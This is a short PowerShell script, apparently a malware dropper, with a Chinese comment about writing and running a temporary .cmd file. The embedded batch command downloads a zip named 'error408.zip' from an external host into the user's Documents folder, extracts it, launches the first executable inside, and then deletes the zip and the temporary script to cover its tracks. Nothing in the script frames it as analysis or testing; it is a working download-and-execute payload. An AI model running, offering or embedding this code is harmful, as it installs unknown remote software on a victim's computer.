$cmdContent = @'
@echo off
powershell -Command "$u='https://png.xrvi.top/file/1787106276468_error408.zip';$d='%USERPROFILE%\Documents\error408.zip';$x='%USERPROFILE%\Documents\error408';try{(New-Object Net.WebClient).DownloadFile($u,$d);Expand-Archive $d -Dest $x -Force;$e=ls $x -rec -inc '*.exe'|select -First 1;if($e){start $e.FullName -WorkingDirectory $e.Directory.FullName};rm $d -Force}catch{pause}"
'@

# 临时写入 .cmd 文件并运行
$tempCmd = [System.IO.Path]::GetTempFileName() + ".cmd"
$cmdContent | Out-File -FilePath $tempCmd -Encoding Default
Start-Process $tempCmd -Wait
Remove-Item $tempCmd -Force